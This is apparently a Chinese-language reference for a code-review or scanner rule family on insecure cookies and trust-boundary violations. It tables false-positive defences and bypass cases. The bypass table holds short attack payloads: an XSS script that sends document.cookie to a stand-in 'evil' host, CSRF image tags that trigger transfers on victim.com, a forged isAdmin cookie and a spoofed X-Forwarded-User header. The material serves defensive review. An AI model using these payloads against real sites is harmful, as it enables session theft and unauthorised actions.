# Cookie & Trust Boundary Family（Insecure Cookie / Trust Boundary Violation）

## 误判案例

| 防御手段 | 误判场景 | 为什么安全 |
|---|---|---|
| Secure + HttpOnly + SameSite=Strict | Cookie 完整安全属性 | HTTP 嗅探不可行，JS 不可读，跨站不发送 |
| 服务端 Session | 会话标识存服务端，Cookie 只存 session ID | 即使 Cookie 泄露也只是 session ID，不含业务数据 |
| Cookie 值签名 | `cookieValue = data + "." + HMAC(data, secret)` | 篡改 Cookie 内容签名验证失败 |
| SameSite=Lax | 阻止跨站 POST 请求携带 Cookie | CSRF 攻击在 Lax 模式下无法通过 POST 触发 |
| 短过期时间 + 滑动窗口 | Cookie 15 分钟过期，活跃时续期 | 窃取的 Cookie 很快失效 |
| HttpOnly + 无 XSS | JS 无法读取 Cookie 且无注入点 | 即使有 XSS 也无法窃取 Cookie |
| 信任边界清晰 | 不从 Cookie/请求头直接读取权限标志 | `isAdmin` 由服务端从 DB 查，不信任客户端 |

## 绕过案例

| 看似防御 | 绕过思路 | 示例 |
|---|---|---|
| 无 Secure 标志 | 中间人嗅探 | 公共 WiFi / 同子网 ARP 攻击截获 HTTP 链路上的 Cookie |
| 无 HttpOnly | 配合 XSS 读取 | `<script>fetch('//evil/?c='+document.cookie)</script>` — JS 直接读取 |
| 无 SameSite | CSRF 跨站携带 | `<img src="https://victim.com/api/transfer?to=attacker&amount=1000">` — 浏览器自动带 Cookie |
| Trust Boundary：信任 Cookie 中的权限标志 | 客户端伪造 | `Cookie["isAdmin"]=true` — 应用直接信任该值 |
| Trust Boundary：信任请求头中的角色 | 请求头注入 | `X-Forwarded-User: admin` — 反向代理设置的头被应用信任，攻击者可伪造 |
| SameSite=Lax 但 GET 接口有副作用 | GET 请求仍携带 Cookie | `<img src="https://victim.com/api/subscribe?plan=premium">` — Lax 允许顶级导航 GET 带 Cookie |
| Cookie 签名但算法弱 | HMAC-SHA1 密钥短 | 暴力破解签名密钥 → 伪造任意 Cookie 值 |
| Session 固定未防御 | 登录前后 session ID 不变 | 攻击者获取未认证 session ID → 诱使受害者用该 ID 登录 → 攻击者共享认证态 |
| 子域 Cookie 覆盖 | `domain=.parent.com` | 子域 `evil.parent.com` 设置 Cookie 覆盖主域的同名 Cookie |
| Secure 标志但 HSTS 未设置 | 首次 HTTP 请求仍明文传输 | 用户首次访问走 HTTP → Cookie 在首次请求时泄露 |
